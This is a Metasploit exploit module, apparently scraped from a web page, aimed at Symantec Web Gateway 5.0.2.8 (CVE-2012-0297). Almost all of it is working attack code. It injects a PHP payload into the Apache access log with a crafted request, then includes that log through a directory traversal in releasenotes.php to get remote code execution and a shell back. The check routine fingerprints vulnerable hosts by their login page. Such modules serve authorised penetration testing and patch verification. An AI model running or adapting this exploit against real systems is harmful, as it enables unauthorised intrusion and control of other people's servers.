# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Symantec Web Gateway 5.0.2.8 Command Execution Vulnerability",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in Symantec Web Gateway&#039;s HTTP
                service.  By injecting PHP code in the access log, it is possible to load it
                with a directory traversal flaw, which allows remote code execution under the
                context of &#039;apache&#039;. Please note that it may take up to several minutes to
                retrieve access_log, which is about the amount of time required to see a shell
                back.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Unknown&#039;, #Discovery
                    &#039;muts&#039;,    #PoC
                    &#039;sinn3r&#039;   #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2012-0297&#039;],
                    [&#039;EDB&#039;, &#039;18932&#039;],
                    [&#039;URL&#039;, &#039;http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00"
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;WfsDelay&#039; => 300,  #5 minutes
                    &#039;DisablePayloadHandler&#039; => &#039;false&#039;,
                    &#039;ExitFunction&#039; => "none"
                },
            &#039;Platform&#039;       => [&#039;php&#039;],
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        =>
                [
                    [&#039;Symantec Web Gateway 5.0.2.8&#039;, {}],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "May 17 2012",
            &#039;DefaultTarget&#039;  => 0))
    end
 
 
    def check
        res = send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => &#039;/spywall/login.php&#039;
        })
 
        if res and res.body =~ /\<title\>Symantec Web Gateway\<\/title\>/
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCode::Safe
        end
    end
 
 
    def exploit
        peer = "#{rhost}:#{rport}"
 
        php = %Q|<?php #{payload.encoded} ?>|
 
        # Inject PHP to log
        print_status("#{peer} - Injecting PHP to log...")
        res = send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "/#{php}"
        })
 
        select(nil, nil, nil, 1)
 
        # Use the directory traversal to load the PHP code
        # access_log takes a long time to retrieve
        print_status("#{peer} - Loading PHP code..")
        send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => &#039;/spywall/releasenotes.php?relfile=../../../../../usr/local/apache2/logs/access_log&#039;
        })
 
        print_status("#{peer} - Waiting for a session, may take some time...")
 
        select(nil, nil, nil, 1)
 
        handler
    end
end



